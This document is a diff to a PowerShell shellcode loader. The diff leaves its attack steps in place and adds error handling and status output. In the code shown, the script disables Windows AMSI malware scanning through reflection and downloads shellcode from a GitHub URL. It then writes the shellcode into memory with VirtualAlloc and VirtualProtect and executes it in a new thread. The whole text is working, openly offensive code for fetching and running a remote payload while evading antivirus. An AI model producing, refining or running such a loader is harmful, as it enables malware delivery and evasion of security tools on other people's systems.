@@ -4,11 +4,20 @@ try {
     [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
         .GetField('amsiInitFailed','NonPublic,Static')
         .SetValue($null,$true)
-} catch {}
+} catch {
+    Write-Host "[!] AMSI bypass failed (probably already patched or not needed)"
+}
 
 $url = "https://github.com/MJansen6/bp/raw/refs/heads/main/shellcode.bin"
-$wc = New-Object Net.WebClient
-$shellcode = $wc.DownloadData($url)
+
+try {
+    $wc = New-Object Net.WebClient
+    $shellcode = $wc.DownloadData($url)
+    Write-Host "[+] Downloaded $($shellcode.Length) bytes"
+} catch {
+    Write-Host "[-] Download failed: $($_.Exception.Message)"
+    exit
+}
 
 $size = $shellcode.Length
 
@@ -19,21 +28,24 @@ Add-Type -MemberDefinition @"
 [DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
 "@ -Name Win32 -Namespace Native -PassThru
 
-$addr = [Native.Win32]::VirtualAlloc([IntPtr]::Zero, [uint32]$size, 0x3000, 0x04)  # MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
+try {
+    $addr = [Native.Win32]::VirtualAlloc([IntPtr]::Zero, [uint32]$size, 0x3000, 0x04)
+    if ($addr -eq [IntPtr]::Zero) { throw "VirtualAlloc failed (error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))" }
 
-if ($addr -eq [IntPtr]::Zero) { throw "VirtualAlloc failed" }
+    [Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)
 
-[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)
+    $oldProtect = 0
+    $success = [Native.Win32]::VirtualProtect($addr, [uint32]$size, 0x20, [ref]$oldProtect)
+    if (-not $success) { throw "VirtualProtect failed (error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))" }
 
-$oldProtect = 0
-$success = [Native.Win32]::VirtualProtect($addr, [uint32]$size, 0x20, [ref]$oldProtect)  # PAGE_EXECUTE_READ
+    $tid = 0
+    $thread = [Native.Win32]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$tid)
+    if ($thread -eq [IntPtr]::Zero) { throw "CreateThread failed (error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))" }
 
-if (-not $success) { throw "VirtualProtect failed" }
+    Write-Host "[+] Thread created → executing shellcode"
+    [Native.Win32]::WaitForSingleObject($thread, [uint32]::MaxValue)   # ← fixed line
 
-$tid = 0
-$thread = [Native.Win32]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$tid)
-
-if ($thread -eq [IntPtr]::Zero) { throw "CreateThread failed" }
-
-# Fixed: use unsigned max value for INFINITE wait
-[Native.Win32]::WaitForSingleObject($thread, [uint32]::MaxValue)
+    Write-Host "[+] Execution finished"
+} catch {
+    Write-Host "[-] Execution error: $($_.Exception.Message)"
+}
